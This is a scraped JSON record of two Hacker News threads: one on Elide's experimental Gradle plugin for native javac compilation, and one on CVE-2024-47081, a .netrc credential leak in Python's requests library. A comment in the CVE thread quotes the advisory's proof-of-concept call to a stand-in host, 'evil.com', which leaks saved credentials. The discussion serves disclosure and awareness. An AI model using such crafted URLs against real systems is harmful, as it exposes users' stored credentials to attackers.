    "submit_time": "2025-06-03T19:59:19 1748980759",
    "num_comments": 14,
    "comments_url": "https://news.ycombinator.com/item?id=44174036",
    "comments": [
      "Would this result in the same .class that javac produces? I.e. at runtime is code compiled with this fundamentally different than code compiled with javac?\n \nreply",
      "This results in identical .class bytecode that `javac` produces, yes, because it's literally just `javac`, but built as a native binary instead of a Java entrypoint.We build at JDK24 and support `--source/--target/--release` so you can build against earlier JVM targets.If you find any output differences between Elide and JDK24 (Oracle GraalVM), then we'd consider that a bug. Similarly, we accept identical compile flags and emit identical warnings/messages, as under the hood we are just using the same compiler APIs but natively.\n \nreply",
      "OK let's say I have an online store I wrote in Spring Framework. What does my before and after development workflow look like after adopting your plugin? It's been a while since I've messed with Java, but how many seconds could it possibly need to fetch a bunch of jar files? I'd love to see an in-the-life-of kind of screencast of what the daily grind looks like for normal java devs these days, so I can understand why it's so slow.For example, what does resolution mean? Does that mean fetching the pom.xml files from sonatype to figure out the dependency graph? Don't those HTTP requests normally go fast? Is Elide sort of like setting up an HTTP caching proxy between corp and sonatype?\n \nreply",
      "> OK let's say I have an online store I wrote in Spring Framework. What does my before and after development workflow look like after adopting your plugin?Basically, you install this plugin, and it tells the `JavaCompile` tasks normally used by Gradle to `isFork = true` and use `elide javac -- ...` for the compile command.So, javac invocations travel over the CLI instead of through the Tooling API, which Gradle normally uses, and which is effectively running in Gradle's daemon VM, and thus is subject to JIT warmup.Through Elide, since it's a native binary, all that JIT warmup is skipped, and you are effectively choosing to balance more toward quick startup and wall-clock time (with many small calls) instead of waiting for JIT warmup to make the Gradle daemon fast with javac.Otherwise, it's a completely identical javac experience. Running `elide javac -help` produces identical help output. Identical inputs should produce identical outputs, and we build it at JDK 24 so it can support `--source/--target/--release X` and friends for anything older down to JDK 8.> For example, what does resolution mean? Does that mean fetching the pom.xml files from sonatype to figure out the dependency graph?It means resolving the graph from declared (direct) dependencies, downloading pom.xml metadata, downloading JARs, unpacking it all to disk, and providing a local `.m2` Maven-compliant root, sort of like Node does for `node_modules/`. Ours lives in `.dev/dependencies/m2` once you run `elide install`.Elide embeds Maven's resolver, so resolution semantics are identical to Maven's. We do some small optimizations to make fetching fast (i.e. initializing related classes at build time, that sort of thing), but honestly not much. Just building Maven's resolver like this yields a major gain, and not messing with it preserves expected behavior.Since Elide emits these deps in a Maven Local-style root, Gradle just finds them on disk when it needs them, so it doesn't need to engage its resolver or fetcher at all.> Don't those HTTP requests normally go fast?It is worth noting that Gradle seems confined to HTTP/1.1 and poor connection pooling even today, so it's not that hard to beat.> Is Elide sort of like setting up an HTTP caching proxy between corp and sonatype?We don't proxy or anything, this fetching still happens through normal Maven Central unless configured otherwise in your `elide.pkl` manifest. For now, deps are placed in the local project, but we want to move to a central cache and link like modern NPM installers do.\n \nreply",
      "(Oh, if you are seeing how the plugin installs a Maven repository, that's just to ship our own plugin artifact and Gradle Catalog, for easy dependency use. maven.elide.dev doesn't proxy to central or anything like that.)\n \nreply",
      "Hypothetically, if you could daemonize javac, would JIT eventually kick in over multiple recompiles of the same code? The obvious use case for this would be IDEs, but I imagine it could work in CI too if you had some kind of persistent \"compiler as a service\" setup that outlived the runners.Not to detract from the cool work done here, just curious if this other approach has been tried too.\n \nreply",
      "> Hypothetically, if you could daemonize javac, would JIT eventually kick in over multiple recompiles of the same code?This is actually how Gradle works by default; in fact, even if you pass `--no-daemon`, it will start a daemon, and just kill it after the build (lol). It's daemon-first, daemon-only, because of this exact issue.As I understand it, Gradle's daemon timeout is typically 10 minutes, but can be extended. We are guessing that this style rarely hits the 10k class threshold where JIT performance converges with native, especially since Gradle also supports incremental compilation, and that further impedes the progress toward a warm JIT. Gradle focuses hard on build caching and incremental compilation, and this is conceptually in contention with reaching a warm JIT, ironically.Native Image has JIT capabilities (just not as mature as Hotspot yet), and keeping the daemon alive would probably still yield wins. We haven't tried it yet and that's a good idea\n \nreply",
      "I'm aware of the Gradle daemon, but wasn't sure if it only handled dependency resolution and other build orchestration tasks or if it also ran the compiler in the same JVM instance. Last time I worked somewhere using Gradle I think we forked the compiler anyway to ensure the project was built on exactly the same Java version regardless of what the Gradle environment was running in, so in that case there is definitely room for startup optimization.I do recall the Gradle daemon living much longer than 10 minutes, though. The docs say 3 hours is default, although if really trying to maximize the JIT advantage it perhaps would make sense to keep it alive as long as possible.\n \nreply",
      "> or if it also ran the compiler in the same JVM instanceHonestly, Gradle's toolchain resolution mechanisms have changed so much, it is a little hard to keep track. Good point> The docs say 3 hours is defaultHuh, I'm not sure where I got 10 minutes. I'll research some more about these assumptions, but even so, having used Gradle professionally and personally for many years (like you), I wonder how often I would have hit that threshold. I was mostly working in smaller projects and companies, though, so my experience could be different from the norm. Even assuming engineers hit that threshold, it would be toward the latter end of that window and only until the end of that window. An experience optimized for cold-start and non-reflection balances this approach, and is even build-cacheable with standard tools like sccache. There are still a lot of projects where JIT-based javac would be optimal> perhaps would make sense to keep it alive as long as possibleIt would for sure. I'm not sure why Gradle was never able to execute on Bazel's full vision for remote execution. Probably a hermeticity problem, considering the challenges they already seem to face with e.g. the configuration cache.In any case, this is great feedback, thank you :)\n \nreply",
      "I work professionally in Python these days, but I've just spent a bit of time digging into the contemporary situation because the JVM environment is much more interesting to me, and found this spec: https://build-server-protocol.github.ioSeems the Scala guys have doubled down on the \"compiler as a service\" approach, presumably because their compile time story continues to be painful. But also looks like the same solution is used for the VS Code Java/Gradle integration, so seems like this might be the more conventional way to go for traditional JVM projects.For processes where the JIT takes a while to kick in, but also you don't want to waste memory keeping JVMs alive while not doing anything (and compilation could be a good example of that), I wondered if there was a way to snapshot and restore the JVM state and turns out some people are experimenting with that too: https://openjdk.org/projects/crac/It's all neat stuff!\n \nreply"
    ],
    "link": "https://github.com/elide-dev/gradle",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        Experimental Gradle plugin for Elide\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.Experimental plugin for using Elide from within Gradle.Make sure to install Elide before proceeding. In GHA, use our\nelide-dev/setup-elide action to install Elide.Create the javac shim in your JAVA_HOME:$JAVA_HOME/bin/elide-javacAlso, make sure to mark it as executable:Install and use the plugin as shown below.That's it! Enjoy faster dependency resolution and Java compilation.NoteWe hope to eliminate the JAVA_HOME shim soon.gradle.propertiessettings.gradle.ktsbuild.gradle.ktsElide is a runtime and batteries-included toolchain for Kotlin/Java, Python, JavaScript, and TypeScript, that can be\nused as a drop-in replacement for javac (among other tools).Elide builds javac as a na"
  },
  {
    "title": "CVE-2024-47081: Netrc credential leak in PSF requests library (seclists.org)",
    "points": 43,
    "submitter": "jupenur",
    "submit_time": "2025-06-03T18:39:29 1748975969",
    "num_comments": 13,
    "comments_url": "https://news.ycombinator.com/item?id=44173193",
    "comments": [
      "Given that the actual vulnerability seems relatively niche along with it being such a popular library officially maintained by the Python foundation, the scariest line in the advisory is almost certainly:The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available.\n \nreply",
      "If you, like me, have never heard of a .netrc file...https://everything.curl.dev/usingcurl/netrc.html\n \nreply",
      "There might be a funny thing with FTP, in which, if a company is using FTP, it's probably for something important.(Even if it's a bad idea now, and compromise of it could result in a bad quarter or regulatory action, legacy systems and priorities happen.)\n \nreply",
      "Well, it's probably just a coincidence, but I literally just spun up a web service that is vulnerable to this: https://isitup.daviey.com/The code doesn't make any reference to a .netrc, but I happen to have one in ~/.netrc:  machine localhost\n  login *REDACTED*\n  password CTF{*REDACTED*}\n\nIt's not ideal that requests automatically slurps credentials from ~/.netrc and leaks them, even when my code never references it. It's possible that the netrc is on the same server from a different application, developer debugging environment, or just forgotten about etc.First one to grab the flag wins, well, nothing. But have fun.  I'll keep it online for a couple of weeks, or until the VC money runs out.\n \nreply",
      "Sorry, you have been blocked\n  You are unable to access daviey.com\n\nLooks like Cloudflare has decided the whole thing is dodgy. Or doesn't like my IP address...\n \nreply",
      "That's really strange... because it seems to be working for some people (already have the first solve).  I can't see an issues in CF...EDIT: I had the security in CF too robust, try now?\n \nreply",
      "Another good example of lax URL parsing/parser differentials being problematic.That being said, I wonder how big the actual impact here is in practice: how many users actually use .netrc? I\u2019ve been using curl and other network tools for well over a decade and I don\u2019t think I\u2019ve ever used .netrc for site credentials.\n \nreply",
      "I think it may be in use by tools without people being aware.\nI decided to check my workstation for it just in case, figuring the file would be empty, or not exist.Instead it seems to be populated with what seem to be Heroku API and git credentials.\n \nreply",
      "I have it on my laptop because it's the most convenient way to download datasets from various repositories (e.g. NASA Earth Data).\n \nreply",
      "Execute the call>requests.get('http://example.com:@evil.com/&apos;)>Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the callInstead of having a url parse error it appears to drop the : and use the password:domain format.\n \nreply"
    ],
    "link": "https://seclists.org/fulldisclosure/2025/Jun/2",
    "first_paragraph": ""
  }
]